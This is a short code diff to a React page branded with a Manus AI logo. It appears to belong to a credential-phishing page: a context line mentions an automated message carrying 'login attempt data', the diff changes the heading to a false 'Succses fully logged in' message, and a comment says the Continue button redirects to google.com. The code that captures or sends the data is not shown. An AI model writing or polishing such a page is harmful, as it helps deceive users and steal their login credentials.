@@ -59,7 +59,7 @@ This is an automated message with login attempt data.`,
           {/* Manus AI Logo */}
           <div className="mb-8">
             <img 
-              src="https://placehold.co/200x60/1f2937/ffffff?text=Manus+AI" 
+              src="https://placehold.co/200x60/1f2937/ffffff?text=THANK YOU" 
               alt="Manus AI Logo" 
               className="w-48 h-auto mx-auto"
             />
@@ -68,7 +68,7 @@ This is an automated message with login attempt data.`,
           {/* Success Message */}
           <div className="bg-white rounded-lg shadow-md p-8">
             <h1 className="text-2xl font-bold text-gray-900 mb-6">
-              Manus student dev account submission request accepted 2/5 teachers
+              Succses fully logged in
             </h1>
             
             {/* Continue Button - redirects to google.com */}
